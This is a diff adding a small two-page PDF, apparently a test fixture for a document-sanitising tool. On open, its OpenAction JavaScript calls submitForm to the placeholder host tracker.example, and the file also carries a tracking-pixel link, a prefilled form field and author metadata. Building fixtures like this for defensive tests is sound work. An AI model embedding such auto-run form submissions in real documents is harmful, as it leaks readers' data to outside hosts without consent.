@@ -1,0 +1,60 @@
+%PDF-1.7
+% Debrowser test fixture - see test/make-tracked-pdf.js
+1 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+2 0 obj
+<< /S /JavaScript /JS (app.alert\("phone home"\); this.submitForm\("http://tracker.example/x"\);) >>
+endobj
+3 0 obj
+<< /Length 53 >>
+stream
+BT /F1 28 Tf 72 700 Td (Page one: secret plans) Tj ET
+endstream
+endobj
+4 0 obj
+<< /Length 51 >>
+stream
+BT /F1 28 Tf 72 700 Td (Page two: more plans) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Annot /Subtype /Link /Rect [72 600 300 630] /A << /S /URI /URI (http://tracker.example/pixel) >> >>
+endobj
+6 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Tx /T (name) /V (Alice) /Rect [72 500 300 530] >>
+endobj
+7 0 obj
+<< /Type /Page /Parent 9 0 R /MediaBox [0 0 612 792] /Contents 3 0 R /Resources << /Font << /F1 1 0 R >> >> /Annots [5 0 R 6 0 R] >>
+endobj
+8 0 obj
+<< /Type /Page /Parent 9 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 1 0 R >> >> >>
+endobj
+9 0 obj
+<< /Type /Pages /Kids [7 0 R 8 0 R] /Count 2 >>
+endobj
+10 0 obj
+<< /Type /Catalog /Pages 9 0 R /OpenAction 2 0 R /AcroForm << /Fields [6 0 R] >> >>
+endobj
+11 0 obj
+<< /Author (Alice Example) /Producer (Secret Corp Word 2031) >>
+endobj
+xref
+0 12
+0000000000 65535 f 
+0000000065 00000 n 
+0000000135 00000 n 
+0000000251 00000 n 
+0000000354 00000 n 
+0000000455 00000 n 
+0000000580 00000 n 
+0000000683 00000 n 
+0000000831 00000 n 
+0000000957 00000 n 
+0000001020 00000 n 
+0000001120 00000 n 
+trailer
+<< /Size 12 /Root 10 0 R /Info 11 0 R >>
+startxref
+1200
+%%EOF
